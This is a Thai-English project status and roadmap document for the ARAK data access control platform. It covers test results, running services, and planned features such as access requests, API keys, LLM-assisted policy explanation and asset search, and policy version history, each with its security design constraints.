| **M23 Personal Security Health Dashboard** | ⬜ **Roadmap ใหม่ — ผู้ใช้ขอ 2026-09-25** · หน้าส่วนตัวของแต่ละคน: ตอนนี้ฉันเข้าถึงอะไรได้บ้าง และปลอดภัยไหม · **ต่อยอดของที่มีแล้ว:** การ์ด Home "what applies to you" · grant ใกล้หมดอายุ + นับถอยหลัง (M9 slice 2c) · query log ของตัวเอง (M10) · **ใหม่:** รวมทุกช่องทางที่ทำให้เข้าถึงได้ (grant · policy ตาม role / team / attribute · owner) พร้อมระดับความอ่อนไหว · สิทธิ์ที่ไม่ได้ใช้ ≥ 90 วัน + ปุ่มคืนสิทธิ์ · คะแนน / checklist ความปลอดภัยส่วนตัว · การแจ้งเตือนความผิดปกติจาก M19 · ดูข้อ AP.14 |
| **M24 Automated Query Risk Blocker** | ⬜ **Roadmap ใหม่ — ผู้ใช้ขอ 2026-09-25** · ประเมินความเสี่ยงของ SQL **ก่อนส่งไป database** แล้วเตือน / ขอเหตุผล / บล็อก · **ที่มีแล้ว:** read-only (SELECT อย่างเดียว) · fail-closed ถ้า parse หรือ resolve table ไม่ครบ · จำกัดแถว `MAX_ROWS` 5,000 · timeout 30 วินาที · **ใหม่:** กฎตรวจโครงสร้าง (ไม่มี WHERE บน table ใหญ่ · cartesian join · `SELECT *` บน PII · ดึง PII จำนวนมาก) · ประเมิน cost ด้วย `EXPLAIN` · คะแนนความเสี่ยง + นโยบาย WARN / REQUIRE_PURPOSE / BLOCK · LLM อธิบายความเสี่ยงจากโครงสร้างที่ตัดค่าจริงออกแล้ว · ดูข้อ AP.15 |
| **M25 On-Demand Test Data Synthesis** | ⬜ **Roadmap ใหม่ — ผู้ใช้ขอ 2026-09-25** · สร้างข้อมูลจำลอง (synthetic data) จาก table จริงเพื่อใช้ทดสอบ / เทรนโมเดล · เรียนสถิติผ่าน proxy ด้วย Differential Privacy (ε กำหนดได้) · รักษาความสัมพันธ์ข้าม table ตาม PK / FK · ส่งออกเป็นไฟล์ หรือเขียนลง sandbox ที่ ARAK เป็นเจ้าของ · **ระวังคำโฆษณา:** "เหมือนจริง 100%" กับ "ปลอดภัย 100%" ทำพร้อมกันไม่ได้ — จะรายงานค่า ε และคะแนน fidelity / privacy ให้เห็นแทน · ดูข้อ AP.16 |
| **M26 LLM Fix with AI + Explain query** | ⬜ **Roadmap ใหม่ — ผู้ใช้ขอ 2026-09-26** *"อยากให้มีปุ่ม ให้ LLM มา Correct ให้"* · *"อยากให้มีปุ่มให้ LLM AI อธิบาย Query ให้ได้ด้วย"* · **(ก) Fix with AI** — เมื่อ query ถูกปฏิเสธเพราะ parse ไม่ได้ / column ไม่มี / syntax ผิด ขึ้นปุ่มในกล่อง error · ส่งไป gateway ของ M11 เฉพาะ **SQL + ข้อความ error + metadata** (ชื่อ table / column / type ของ source ที่เลือก) · SQL ที่แก้แล้ว **วางลง editor เป็นข้อเสนอ ให้คนกด Run เอง** และยังต้องผ่าน proxy + policy (fail-closed) เหมือนเดิม · ห้ามใช้ Fix เพื่อหลบการปฏิเสธเพราะไม่มีสิทธิ์ — refusal เรื่องสิทธิ์ต่อปุ่มขอสิทธิ์ของ M13 ไม่ใช่ปุ่ม Fix · **(ข) Explain query** — ปุ่มบนหน้า Query อธิบายเป็นภาษาคนว่า SQL นี้ทำอะไร join อะไร กรองอะไร · ⚠️ **ห้ามส่งแถวผลลัพธ์ให้ LLM** |
| **M27 ขอสิทธิ์ในนามกลุ่ม** | ⬜ **Roadmap ใหม่ — ผู้ใช้ถาม 2026-09-26** · ตอนนี้คำขอผูกกับผู้ขอคนเดียว (`access_request.requester_id`) · ต้องเพิ่ม subject เป็น group / team · approver ต้องเห็นรายชื่อสมาชิก ณ ตอนอนุมัติ · grant ที่ออกให้กลุ่มต้องตามสมาชิกที่เปลี่ยนภายหลัง (หรือ snapshot — ต้องตัดสินใจ) · คนขอต้องเป็นสมาชิก / owner ของกลุ่ม |
| **M28 Conversational ARAK Agent** | ✅ **เสร็จรอบนี้ (ข้อ BP)** · น้องรักษ์คุยได้ + tool calling (ค้น catalog ตามสิทธิ์ · เขียน SQL เป็น card · ร่าง policy · query log / dashboard · พาไปหน้าในแอป) · ปุ่ม Ask NokRak ใน Catalog + global search · สิทธิ์ต่องานของ AI ตั้งต่อ role ใน Settings (V29) · ไม่รัน / apply / approve อะไรเอง |

**ที่รันอยู่ตอนนี้**
| | |
|---|---|
| Backend (Dropwizard) | `:8080` (API อยู่ใต้ `/api`), admin `:8081/ping` |
| Frontend (Vite dev) | `http://localhost:3000/` |
| **รูปแบบ prod (jar เสิร์ฟ `dist` + nginx path prefix)** | `http://localhost:8090/Arak/` — ตัวที่ใช้ demo |
| App DB (docker `dac-appdb`, postgres:16-alpine) | `:5432` db/user `dac` |
| OpenMetadata ของทีม | `2.0.1` — sync ผ่าน **ingestion-bot JWT** (ดู What Didn't Work) |

**รันครบล่าสุด 2026-10-04 (ข้อ DB)** — backend `./mvnw -o -Pintegration verify` BUILD SUCCESS · unit 1,437 · integration 562 · รวม 1,999 ไม่มี fail · frontend jest 88 suites / 917 ผ่าน · type-check ผ่าน · ตัวเลขในย่อหน้าและตารางข้างล่างเป็นของรอบ 2026-09-25

เทสต์ทั้งหมดเขียว — **backend unit + integration รันครบเมื่อ 2026-09-25 → `./mvnw -o verify -Pintegration` BUILD SUCCESS · unit 852 · integration 278 · Failures 0 Errors 0** (รอบ BE: +39 unit ใน dac-service — `AuditResourceTest` 11 · `DashboardResourceTest` 10 · `QueryRefusalsTest` ใหม่ · integration +17 — `QueryLogIT` 10 · `DashboardIT` 7 · รอบ BD: +20 unit ใน dac-service — `AccessDashboardResourceTest` 15 ใหม่ · `HomeLayoutValidatorTest` +4 · `HomeLayoutStoreTest` +1 · integration **261** (+10 `AccessDashboardIT` ใหม่) · frontend **38 suites / 369 tests** (+12 `accessWidgets.test.tsx` ใหม่) · ดูข้อ BD.5 · รอบ BC: +21 unit ใน dac-service — `AccessReviewTest` 17 ใหม่ · `AccessRequestResourceTest` +4 · integration **251** (+9 `AccessRequestIT` `Reviewing`) · frontend **37 suites / 357 tests** (+8 `AccessRequestsPage.test.tsx` · +2 `PolicyBuilderPage.test.tsx`) · ดูข้อ BC.6 · รอบ BB: +59 unit ใน dac-service — `StageEngineTest` 23 · `AccessWorkflowTest` 12 · `ApproverDirectoryTest` 5 · `AccessRequestResourceTest` 5 · `AccessWorkflowResourceTest` 14 · integration **242** (+25 `AccessRequestIT` `Workflows` / `Configuring` / `Legacy`) · frontend **37 suites / 347 tests** (+`AccessWorkflowsPage.test.tsx` 17) · ดูข้อ BB.6 · รอบ BA: +6 `StewardshipTest` · +11 `StewardshipGuardsTest` · integration **217** (+3 `AccessRequestIT.Deciding` `ownerTypeMatters` · `grantReach` · `stranded`) · รอบ AY: +1 `SpaServletTest.unusualCharacters` · integration **214** (รอบ AZ: +5 `AccessRequestIT.Notices`) — **+23 จาก `AccessRequestIT`** ขอ / อนุมัติ / ปฏิเสธ / ถอน + เคส policy ชนกัน (DENY · ชั้นบนปฏิเสธ · override · approve ไม่ปลด mask) บน Postgres จริง), frontend `npx jest` + `npx tsc --noEmit` + `vite build` รันใหม่ **2026-09-25** (**36 suites / 307 tests** เขียว — รอบ BA: `AccessTab.test.tsx` ใหม่ 4 · `AccessRequestsPage.test.tsx` ±0 สุทธิ · `accessRequests.test.ts` +1 · ดูข้อ BA.4, AZ.5, AY.5 และ AX.8 · tsc exit 0 · build 11.78s · `scripts/check-cursor-pointer.mjs` → *every &lt;button&gt; offers a hand*)

> ⚠️ **`backend/dac-service/target/surefire-reports/com.mfec.dac.catalog.AssetStoreIT.txt` ยังแดงค้างอยู่ในโฟลเดอร์ — เป็นไฟล์เก่าจาก 2026-09-23 20:35 ก่อน commit `19b0503` ซึ่งคือ commit ที่แก้เคสนั้นพอดี** อย่าอ่านรายงานใน `target/` โดยไม่ดูเวลาไฟล์ — `mvn test` ไม่ล้างรายงานของคลาสที่รอบนี้ไม่ได้รัน

| ชุด | จำนวน | คำสั่ง |
|---|---|---|
| Backend unit | dac-common 31 · dac-engine 277 · **dac-compiler-sql 51 (+17 — `RowEntitlementMaintainerTest`)** · dac-connector-openmetadata 91 · **dac-connector-source 25 (+6 — `SecureViewApplierTest`)** · dac-proxy 30 · **dac-service 347** = **852** (dac-service **347** — +39 ข้อ BE (`AuditResourceTest` · `DashboardResourceTest` · `QueryRefusalsTest`) · +15 `AccessDashboardResourceTest` · +4 `HomeLayoutValidatorTest` · +1 `HomeLayoutStoreTest` ข้อ BD · ก่อนหน้า **288** — +17 `AccessReviewTest` · +4 `AccessRequestResourceTest` ข้อ BC · ก่อนหน้า **267** — +23 `StageEngineTest` · +12 `AccessWorkflowTest` · +5 `ApproverDirectoryTest` · +5 `AccessRequestResourceTest` · +14 `AccessWorkflowResourceTest` ข้อ BB · ก่อนหน้า **208** — +6 `StewardshipTest` · +11 `StewardshipGuardsTest` ข้อ BA · ก่อนหน้า **191** — +4 `AccessEligibilityTest` · +1 `SpaServletTest.unusualCharacters` ข้อ AY) | `./mvnw -o test` |
| Backend integration (Testcontainers `postgres:16-alpine`) | **278 tests** — **`QueryLogIT` 10 · `DashboardIT` 7 (ใหม่ ข้อ BE.6)** · `AccessDashboardIT` 10 (ข้อ BD.5) · **`AccessRequestIT` 65 (+9 `Reviewing` ข้อ BC.6 · +25 `Workflows` 17 · `Configuring` 4 · `Legacy` 4 ข้อ BB.6 · +3 `Deciding` ข้อ BA.1a/BA.4 · +5 `Notices` ข้อ AZ.5 · 23 ข้อ AX.8)** · `AssetStoreIT` 7 · `CatalogQueryIT` 18 · `DataSourceStoreIT` 13 · `GovernanceStoreIT` 10 · `GrantCompositionIT` 17 · **`HomeLayoutStoreIT` 14 (+8 รอบนี้ — persona)** · `IdentityAdminStoreIT` 24 · `ImpactAnalysisIT` 8 · `PolicyBindingMaterializerIT` 10 · `PolicyOverviewIT` 24 · `PolicyStoreIT` 10 · **`SecureViewApplierIT` 11 (ใหม่รอบนี้ — อยู่ใน `dac-connector-source` ไม่ใช่ `dac-service`)** · **`SecureViewServiceIT` 15 (ใหม่รอบนี้)** · `SourceEngineRegistryIT` 5 | `./mvnw verify -Pintegration` (ทั้ง reactor) |
| Frontend | **50 suites / 505 tests** (รอบ BP: `AssistChat.test.tsx` ใหม่ 13 · `AssistDock.test.tsx` ใหม่ 6 · `AskArak.test.tsx` ใหม่ 5 · `LlmFeatureAccess.test.tsx` ใหม่ 7 · รอบ BE: `QueryLogPage.test.tsx` ใหม่ 11 · `DashboardPage.test.tsx` ใหม่ 16 · รอบ BD: `accessWidgets.test.tsx` ใหม่ 12 · รอบ BC: `AccessRequestsPage.test.tsx` +8 · `PolicyBuilderPage.test.tsx` +2 · รอบ BB: `AccessWorkflowsPage.test.tsx` ใหม่ 17 · รอบ BA: `AccessTab.test.tsx` ใหม่ 4 · `accessRequests.test.ts` +1 · `AccessRequestsPage.test.tsx` แทน 2 เคส Grant-for ด้วย 1 + stranded 1 · รอบ AZ: `AccessRequestsPage.test.tsx` 22 (+9) · `RequestNotices.test.tsx` ใหม่ 10 — ดูข้อ AZ.5 · รอบ AY: +10 `AriaRouter.test.tsx` · `AssetRequestAccess.test.tsx` 9 · +4 `AssetDetailPage.test.tsx` — ดูข้อ AY.5 · รอบ AX: +20 `SqlEditor.test.tsx` · +16 `RequestAccess.test.tsx` · +13 `AccessRequestsPage.test.tsx` · +5 `accessRequests.test.ts` · `sqlCompletion.test.ts` — ดูข้อ AX.8 · ก่อนหน้า: +7 `EnforcementPage.test.tsx` — dry run → apply ส่งแค่ reviewId · non-admin ไม่มีปุ่ม Apply / Roll back · apply ที่ถูกปฏิเสธล้าง review · rollback ต้องยืนยัน · +9 `policyFlow.test.ts` — ลำดับด่าน · selector ว่าง = 0 asset ไม่ใช่ทุก asset · subject ว่าง = `open` ไม่ใช่ `set` · "ไม่ผ่านด่าน" ต้องไม่อ่านว่า deny · +3 `PolicyFlowChart.test.tsx` — ไม่ส่ง `onEdit` ต้องไม่มีปุ่มใดๆ · ก่อนหน้านี้ +4 ใน `HomePersonasPage.test.tsx` — หน้าที่คนหนึ่งจัดหน้าจอให้อีกคน: admin เท่านั้นที่เห็น · ครบทั้ง 5 role ไม่ว่าจะตั้งไว้หรือยัง · ประโยค "starting point ไม่ใช่ override" · เซฟแล้วต้องลง role ที่เปิดอยู่เท่านั้น) | `npx jest` ใน `frontend/app` |

`yarn type-check` · `yarn lint` · `yarn build` ผ่านหมด → **BUILD SUCCESS** ทั้งสองฝั่ง

---

## Roadmap ที่เพิ่มรอบนี้ — **M13 · M14 · M15 · M16 · M17 · M18 · M19 · M20 · M21 · M22 · M23 · M24 · M25 · M31–M36** (ผู้ใช้ขอ 2026-09-24 · M19–M25 / ไฟล์แนบของ M9 ขอ 2026-09-25 · M31–M36 ขอ 2026-09-28)

ผู้ใช้สั่งว่า *"ช่วยเพิ่ม Roadmap เพิ่ม Access Control ให้เรามีความพิเศษ"* แล้วให้มาสามข้อ
แล้วขอเพิ่มข้อที่สี่ ห้า และหกตามมาในวันเดียวกัน (M16, M17, M18)
ทั้งหกข้อไม่ใช่ของประดับ — แต่ละข้อปิดรูที่ **มีอยู่จริงและวัดได้** ในของที่รันอยู่ตอนนี้

### AP.1 M13 — Request access จากจุดที่โดนปฏิเสธ

**รูที่มีอยู่จริง** — ยิง query จริงเมื่อกี้ได้คำตอบนี้กลับมา:

```
POST /api/v1/query  {"sourceId":"…","sql":"SELECT * FROM sales.customer"}
→ "Access to demo-pg.salesdb.sales.customer is denied.
   finance-subscription did not apply: outside the policy's permitted time window"
```

ข้อความนี้ถูกต้องและอธิบายได้ (FR-5.4 ทำงาน) **แต่มันเป็นทางตัน** — คนอ่านรู้ว่าตัวเองไม่มีสิทธิ์
แล้วต้องไปเดาเองว่าใครเป็นเจ้าของ table นี้ แล้วเดินไปถามใน Teams ซึ่งเป็นขั้นตอนที่หลุดจากระบบทั้งหมด
และ audit ตอบไม่ได้ว่าใครเคยขออะไรไว้บ้าง

**สิ่งที่ต้องทำ**

| ชั้น | งาน |
|---|---|
| Engine | `PolicyDecision` มี `reasons()` อยู่แล้ว — ต้องพา **policy id + scope level** ที่ปฏิเสธติดมาถึง response ไม่ใช่แค่ string |
| API | refusal body เพิ่ม `assetFqn`, `deniedBy[]`, `approvers[]` (resolve จาก `asset_owner` ที่ crawl มาแล้ว) และ `requestable: true\|false` |
| UI | หน้า Query: กล่อง refusal ขึ้นปุ่ม **"ขอสิทธิ์กับเจ้าของ"** → เปิดฟอร์มที่กรอก asset / policy ที่ติด / SQL ที่พยายามรัน / ช่องเหตุผล + purpose + duration ไว้ให้แล้ว |
| หน้า Catalog | ปุ่มเดียวกันบนหน้า asset สำหรับคนที่ยังไม่ได้ลองยิง query |

⚠️ **ขึ้นกับ M9** — ปลายทางของปุ่มคือ `access_request` ที่ M9 จะสร้าง ทางเตรียมไว้หมดแล้ว
(`grant.source` = `manual` \| `request` + `request_id` nullable ตั้งแต่ V11 · `asset_owner` พร้อม route)
→ **ทำ M13 พร้อม M9 เป็นชิ้นเดียวกัน** อย่าทำแยก ไม่งั้นได้ปุ่มที่กดแล้วไม่มีอะไรรับ

⚠️ **ข้อที่ต้องระวัง** — refusal ที่บอกว่า "ไปขอคนนี้" คือการ**เปิดเผยว่า asset นี้มีอยู่จริง**
ให้คนที่ไม่มีสิทธิ์เห็น ถ้า asset บางตัวเป็นความลับระดับที่ห้ามรู้แม้กระทั่งว่ามันมีอยู่
ต้องมี flag ต่อ policy ว่า **ปฏิเสธแบบไม่บอกอะไรเลย** (ตอนนี้ยังไม่มี)

### AP.2 M14 — Public API + Swagger + Org Key

**รูที่มีอยู่จริง** — ทุก endpoint ของ ARAK auth ด้วย **JWT ที่ได้จาก `POST /v1/auth/login` เท่านั้น**
ซึ่งแปลว่าระบบอื่นจะเรียก ARAK ได้ต้องเอา **password ของคนจริง** ไปฝังไว้ ซึ่งผิดทุกข้อ
และตอนนี้ยัง**ไม่มี OpenAPI spec ของ API เราเอง** (ที่ pin ไว้ใน repo คือ swagger ของ **OpenMetadata** คนละตัวกัน)

**สิ่งที่ต้องทำ**

| ชั้น | งาน |
|---|---|
| Spec | ผูก `dropwizard-swagger` / `swagger-jaxrs2` generate OpenAPI จาก resource จริง + เสิร์ฟ Swagger UI ที่ `/api/openapi` — **generate จากโค้ด ห้ามเขียน spec มือ** ไม่งั้นมันจะไม่ตรงภายในสองสัปดาห์ |
| Migration | `org_api_key` — `id` · `label` · `key_hash` · `principal_id` FK · `scopes text[]` · `expires_at NOT NULL` · `created_by` · `last_used_at` · `revoked_at` |
| Auth filter | `X-ARAK-Key` → hash → lookup → เช็ค `expires_at` → ผูกเป็น `AuthenticatedUser` ตัวเดิม |
| Scope | อย่างน้อย `policy:read` · `policy:write` · `query:run` · `catalog:read` |
| UI | หน้า Settings ออก key ได้ + โชว์ key **ครั้งเดียวตอนสร้าง** + ตารางบอกว่าแต่ละใบหมดอายุเมื่อไหร่/ใช้ล่าสุดเมื่อไหร่ + ปุ่ม revoke |

⚠️ **กติกาที่ห้ามถอด**
1. **เก็บเป็น hash เท่านั้น** (Argon2id หรือ SHA-256 + salt) — DB ที่หลุดต้องไม่แปลว่า key หลุด
2. **`expires_at` เป็น NOT NULL** ตามที่ผู้ใช้สั่ง — ห้ามมี key ที่ไม่มีวันตาย
3. **key ไม่เพิ่มสิทธิ์ให้ใคร** — สิทธิ์ที่แท้จริง = `scopes ∩ สิทธิ์ของ principal เจ้าของ key`
   key ของ Requester สร้าง policy ไม่ได้ ต่อให้ขอ scope `policy:write` มา
4. **query ผ่าน key ต้องวิ่งผ่าน `QueryService` ตัวเดิม** — policy เดิม, audit เดิม, cap เดิม
   ห้ามมีทางลัดที่ข้าม PolicyEngine เด็ดขาด
5. **ทุกการใช้ key ลง `audit_query` / `audit_decision` พร้อมบอกว่ามาทาง key ใบไหน**

### AP.3 M15 — LLM อธิบาย policy และอธิบาย dashboard

**รูที่มีอยู่จริง** — หน้า `/policies/:id` ตอนนี้แสดง selector, subject rule, row filter, mask
ได้ครบและถูกต้อง แต่มันแสดงเป็น **โครงสร้าง** ไม่ใช่ **คำอธิบาย** — คนที่ไม่ได้เขียน policy ตัวนั้นเอง
ต้องนั่งประกอบในหัวว่าเจ็ดชั้นรวมกันแล้วแปลว่าอะไร ซึ่งเป็นสิ่งที่ FR-5.1 บอกเองว่า
**คนทำไม่ได้อย่างน่าเชื่อถือ**

**(ก) อธิบาย policy** — ปุ่มในหน้า `/policies/:id` และในหน้า asset
ส่งให้ LLM: policy JSON + ชั้นที่มันอยู่ + policy ชั้นอื่นที่ match asset เดียวกัน + capability matrix
ได้กลับมา: ย่อหน้าภาษาคนว่า *ใครเห็นอะไร ไม่เห็นอะไร เพราะอะไร* + **คำเตือนว่าข้อไหนจะถูกชั้นบนทับ**

**(ข) อธิบาย dashboard** — ปุ่มบนแต่ละกราฟใน M10
ส่งให้ LLM: **ตัวเลขสรุปของกราฟนั้น** + นิยามของ metric
ได้กลับมา: มันแปลว่าอะไร ผิดปกติตรงไหน ควรไปดู asset/principal ตัวไหนต่อ

⚠️ **กติกาที่ห้ามถอด (ต่อจาก FR-2.6 และของเดิมใน `AssistPrompts`)**
1. **ส่ง metadata และตัวเลขสรุปเท่านั้น ห้ามส่งแถวข้อมูลจริงแม้แต่แถวเดียว** — บังคับด้วยโครงสร้าง
   เหมือนที่ `AssistPromptsTest.carriesNoValues` ทำอยู่ ไม่ใช่ด้วยการเตือนใน prompt
2. **LLM ไม่มี write path** — อธิบายได้อย่างเดียว activate/แก้ policy ไม่ได้
3. **คำอธิบายไม่ใช่คำตัดสิน** — หน้าจอต้องเขียนกำกับว่านี่คือคำอธิบายที่ LLM สร้าง
   ของจริงคือ **simulator (FR-5.2)** ที่คำนวณจาก engine จริง ห้ามให้คนเข้าใจสลับกัน
4. **ยังเป็น per-user gateway** — ใช้ key ของคนที่กด ไม่ใช่ key กลาง (ตามที่ผู้ใช้สั่งไว้ที่ AO.8)
   ใครไม่ได้ตั้ง gateway ไว้ ปุ่มนี้ไม่ขึ้น และ**ทุกอย่างอื่นในหน้าต้องใช้ได้ตามปกติ**

### AP.4 M16 — LLM ช่วยหา asset จากสิ่งที่อยากได้

> `ทำ option ใน Query ให้สามารถใช้ LLM ช่วยค้นหา Asset ตามที่ user อยากได้`
> `เช่น user พิมพ์ว่าอยากได้ข้อมูล ผลิตภัณฑ์ และราคา LLM จะไปหาใน Metadata ให้`
> `แล้ว Suggest table ที่ต้อง Query หรือที่ต้องขอเพิ่มเติมมาให้`

**รูที่มีอยู่จริง** — ช่อง Search ในหน้า Catalog ตอนนี้เป็น keyword match ตรงๆ (`SearchQuery`)
คนที่รู้อยู่แล้วว่าตารางชื่อ `customer` ก็หาเจอ แต่คนที่รู้แค่ว่า *"อยากได้ราคาสินค้า"* ต้องเดาคำ
ว่าองค์กรนี้เรียกมันว่า `price` / `unit_price` / `list_amt` / `mst_prod_prc` — และถ้าเดาผิดก็สรุปว่า
"ไม่มีข้อมูล" ทั้งที่มี นี่คือปัญหาที่ metadata มีคำตอบอยู่แล้ว (description, tag, glossary term,
domain, column comment) แต่ไม่มีอะไรอ่านมันให้

**สิ่งที่จะทำ**

1. หน้า Query เพิ่มโหมด **"บอกสิ่งที่อยากได้"** ข้างๆ ช่อง SQL (เป็น option ไม่ใช่ตัวบังคับ —
   คนที่เขียน SQL เป็นอยู่แล้วต้องไม่ถูกขวาง)
2. Backend รับประโยค → **ค้น metadata ก่อน ไม่ใช่ส่งให้ LLM ก่อน**:
   keyword + trigram บน `asset.name` / `asset.description` / `asset_column.name` /
   `asset_column.description` / `asset_facet` (tag · glossary term · domain) → ได้ candidate ~50 ตัว
3. **กรองด้วยสิทธิ์ของคนที่ถามทันทีตรงนี้** แล้วแบ่งเป็นสองกอง:
   - **กองที่ query ได้เลย** — `QueryService` ตอบ allow
   - **กองที่ต้องขอสิทธิ์** — asset มีอยู่จริงและตรงคำถาม แต่ policy ปฏิเสธ
4. ส่ง **เฉพาะ metadata ของ candidate** ให้ LLM จัดอันดับและเขียนเหตุผล
   (ชื่อ · description · dtype · tag · term — **ไม่มีค่าในตารางแม้แต่แถวเดียว**)
5. ผลลัพธ์บนหน้าจอเป็นการ์ดต่อ asset: ชื่อ · ทำไมถึงน่าจะใช่ · คอลัมน์ที่เกี่ยวข้อง และปุ่ม
   - query ได้ → **"ใส่ SQL ให้"** เติม `SELECT <คอลัมน์ที่แนะนำ> FROM <fqn>` ลง editor
   - ยังไม่มีสิทธิ์ → **"ขอสิทธิ์กับเจ้าของ"** ซึ่งคือปุ่มตัวเดียวกับ M13

**สามข้อที่ห้ามผ่อน**

1. **LLM เห็นแค่ metadata** — ห้ามส่งแถวข้อมูล ห้ามส่ง sample value
   (กฎเดียวกับ `AssistPrompts` ที่มี `AssistPromptsTest.carriesNoValues` ยันอยู่แล้ว)
2. **กรองสิทธิ์ก่อนถาม LLM ไม่ใช่หลัง** — ถ้าปล่อยให้ LLM เห็น candidate ทั้งหมดแล้วค่อยกรอง
   ทีหลัง ฟีเจอร์นี้จะกลายเป็นช่องส่องว่าองค์กรมีตารางอะไรอยู่บ้าง ซึ่งเป็นข้อมูลที่ policy
   ตั้งใจปิด
   ⚠️ **แต่กองที่สอง (ต้องขอสิทธิ์) ตั้งใจเปิดเผยว่า asset นั้นมีอยู่** — เป็นเรื่องเดียวกับความเสี่ยง
   ที่บันทึกไว้ที่ AP.1 และต้องใช้ flag ตัวเดียวกัน (policy ที่ตั้งเป็น "ปฏิเสธโดยไม่บอกอะไรเลย"
   ต้องหายไปจากผลการค้นด้วย ไม่ใช่โผล่ในกองที่สอง) — **flag นี้ยังไม่มี ต้องทำพร้อมกัน**
3. **ยังเป็น per-user gateway** — ใช้ key ของคนที่กด ใครไม่ได้ตั้ง gateway ไว้ โหมดนี้ไม่ขึ้น
   และช่อง SQL ปกติต้องใช้ได้ครบเหมือนเดิม

**ของที่มีอยู่แล้วและต่อยอดได้ทันที** — `SearchQuery` (keyword) · `CatalogQuery` (schema brief
ที่ `LlmAssistResource` ใช้อยู่) · `QueryService` (ตัวตัดสินว่า allow ไหม) · `asset_facet` ที่กาง
ancestor ไว้แล้ว → งานใหม่จริงๆ คือ **ตัวจัดอันดับ + การ์ดผลลัพธ์ + การแบ่งสองกอง**

### AP.5 M17 — ประวัติย้อนหลังของ policy

> ✅ **เสร็จแล้วในข้อ CA** — ครบทั้ง 5 ข้อด้านล่าง

> `v13 · active ที่เก็บของ policy นี่เก็บไว้ที่ไหนอะ เพิ่ม Roadmap ให้สามารถดูย้อนหลังได้`

**คำตอบก่อน: เก็บอยู่แล้ว และเก็บครบ**

| สิ่งที่เห็น | มาจาก |
|---|---|
| `v13` | `policy.version` — เลขปัจจุบัน บวกทีละ 1 ทุกครั้งที่บันทึก |
| `active` | `policy.lifecycle_state` — `DRAFT` / `PENDING_APPROVAL` / `ACTIVE` / `DISABLED` / `ARCHIVED` |
| **ของเก่าทุกเวอร์ชัน** | **`policy_version`** (มาตั้งแต่ `V3__policy.sql`) — `UNIQUE (policy_id, version)` เก็บ `document` **ทั้งใบ** + `lifecycle_state` ณ ตอนนั้น + `changed_by` + `change_reason` + `changed_at` |

`PolicyStore` เขียน `policy_version` **ก่อน** แก้แถวจริงทุกครั้ง (class doc เขียนไว้ว่า
*"Every write appends to `policy_version` before it changes …"*) เป็น append-only —
rollback ตาม FR-9.2 ต้อง**เขียนเวอร์ชันใหม่** ไม่ใช่ลบหรือแก้ของเก่า เพื่อให้คำถามว่า
"ตอนวันที่ X policy หน้าตาเป็นยังไง" ตอบได้เสมอ

**รูที่มีอยู่จริง — ข้อมูลมี แต่ไม่มีทางดู**

1. `GET /v1/policies/{id}/versions` เปิดอยู่แล้ว (`PolicyResource:109`) และ
   `fetchPolicyVersions()` เขียนไว้แล้วใน `frontend/app/src/api/policies.ts:139`
   — **แต่ไม่มี component ไหนเรียกมันเลยสักที่** ค้นทั้ง `frontend/app/src` แล้วเจอแค่บรรทัดที่ประกาศ
2. `PolicyStore.history()` **SELECT `change_reason` มาแล้วทิ้ง** — map ลง `StoredPolicy`
   ไม่มีช่องให้มัน เหตุผลที่คนกรอกตอนแก้ policy จึงถูกเก็บลง DB แต่ไม่เคยถูกอ่านกลับ
3. **`audit_policy_change` ยังไม่มีใครเขียนลงไปเลยสักแถว** — `grep` ทั้ง `src/main` ไม่เจอ
   ตารางมีตั้งแต่ V3 แต่ว่างเปล่า (FR-8.1 ยังไม่ปิด)
4. ไม่มี **diff** — ต่อให้เปิดสองเวอร์ชันมาดู ก็ต้องอ่าน JSON เทียบเอง
5. ไม่มีปุ่ม **rollback**

**สิ่งที่จะทำ**

1. **แท็บ History** บนหน้า policy detail: ไทม์ไลน์ `v13 → v12 → v11 …` แต่ละแถวบอก
   **ใคร · เมื่อไหร่ · state ตอนนั้น · เหตุผลที่กรอกไว้**
2. **แก้ `PolicyStore.history()` ให้ส่ง `change_reason` กลับมาจริง** (เพิ่มช่องใน `StoredPolicy`
   หรือทำ record แยกสำหรับหน้า history — น่าจะแยกดีกว่า เพราะ `StoredPolicy` ตอนนี้ถูกยัด
   `null` สองช่องเพื่อให้ใช้ซ้ำได้ ซึ่งอ่านยากอยู่แล้ว)
3. **Diff สองเวอร์ชัน** — เทียบที่ระดับ *ความหมาย* ไม่ใช่ระดับ text: selector เปลี่ยนจากอะไรเป็นอะไร
   · subject rule เพิ่ม/ลดเงื่อนไขข้อไหน · row filter · column mask ตัวไหนเข้มขึ้น/ผ่อนลง
   (diff ของ JSON ดิบจะเต็มไปด้วยการสลับลำดับ key ที่ไม่ได้แปลว่าอะไร)
4. **Rollback** — `POST /v1/policies/{id}/rollback/{version}` เขียนเป็น **เวอร์ชันใหม่**
   พร้อมบังคับกรอกเหตุผล · สิทธิ์เท่ากับการแก้ policy · ถ้า policy กำลัง `ACTIVE` ต้อง
   **แสดง impact analysis ก่อน** (มี `ImpactAnalysis` อยู่แล้ว) เพราะ rollback คือการเปลี่ยน
   สิทธิ์ของคนจริงย้อนกลับ ไม่ใช่การ undo ไฟล์
5. **ปิด `audit_policy_change`** ให้ครบ — ใคร แก้อะไร ค่าเดิม→ค่าใหม่ เมื่อไหร่
   (`policy_version` ตอบ "หน้าตาแต่ละเวอร์ชัน" แต่ตอบ "ใครกดอะไรตอนไหน" ได้ไม่ครบ เช่น
   การเปลี่ยน lifecycle อย่างเดียว หรือการ resolve binding ใหม่)

**ข้อควรระวัง** — `policy_version.document` เก็บ policy ทั้งใบ ซึ่งอาจมีชื่อคน/ชื่อทีมใน
subject rule หน้า History จึงต้อง **จำกัดสิทธิ์เท่ากับหน้า policy เอง** ไม่ใช่เปิดกว้างกว่า
เพราะมันคือข้อมูลชุดเดียวกันแค่เก่ากว่า

### AP.7 M18 — รองรับ database type ใหม่โดยไม่ต้องไล่แก้ 14 จุด

> `ต้องออกแบบให้ต่อได้หลาย database type ในอนาคตนะ คำนึงถึงเรื่องนี้แล้วหรือยัง`

**คำตอบตรงๆ: คำนึงถึงแล้วครึ่งเดียว** — ครึ่งที่แพงถูกแล้ว ครึ่งที่ถูกกลับกระจาย

**ส่วนที่พร้อมอยู่แล้ว (ไม่ต้องแตะตอนเพิ่ม engine)**

| ของ | ทำไมถึงพร้อม |
|---|---|
| `PolicyDecision` | ไม่มีคำว่า SQL อยู่ในนั้นเลย — engine ตัดสินโดยไม่รู้ปลายทาง นี่คือผลตอบแทนของการลงทุนทำ Policy IR ตั้งแต่ M0 |
| `SqlDialect` | interface 16 method · `ViewCompiler` + `DecisionSql` เรียกผ่าน interface ล้วน |
